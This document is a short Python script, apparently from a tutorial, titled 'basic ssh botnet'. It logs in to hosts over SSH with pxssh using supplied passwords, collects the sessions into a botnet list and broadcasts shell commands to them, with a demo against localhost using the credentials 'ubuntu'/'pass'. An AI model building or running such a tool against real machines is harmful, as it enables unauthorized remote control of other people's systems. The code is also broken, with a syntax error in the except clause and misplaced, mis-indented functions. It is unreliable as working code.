#basic ssh botnet write following code
import pxssh
class Client:
    def __init__(self,host,user,password): #create initializer
        self.host=host
        self.user=user
        self.password=password
        self.session=self.connect() #for ssh session
    def connect(self): #connect method,takes self
        try:
            s=pxssh.pxssh()
            s.login(self.host,self.user,self.password)
            return s #if login done.
        except Exception e: #if fails
            print(e)
            print("[-] Error connecting")
    def send_command(self,cmd): #another method, send_command
        self.session.sendline(cmd)
        self.session.prompt() #informs our command is run
        return self.session.before #process or return results.
    def botnetCommand(command): #function to send command
        for client in botNet:
            output=client.send_command(command) #to get output
            print("[*] Output from"+client.host) #for displaying output
            print("[+]"+output) #finally prints output
    def addClient(host,user,password): #adding client to botnet
        client=Client(host,user,password)
        botNet.append(client) #adding client session to botnet
        botNet=[]
        addClient("127.0.0.1",'ubuntu','pass') #adding loop back address as out client, ubuntu is username and netx one pass is password
        botnetCommand("ls -la") #lists everything of home diretory


#sudo apt-get install ssh
#python botnet.py
        #this will returns with a list of everything in the home directory
        
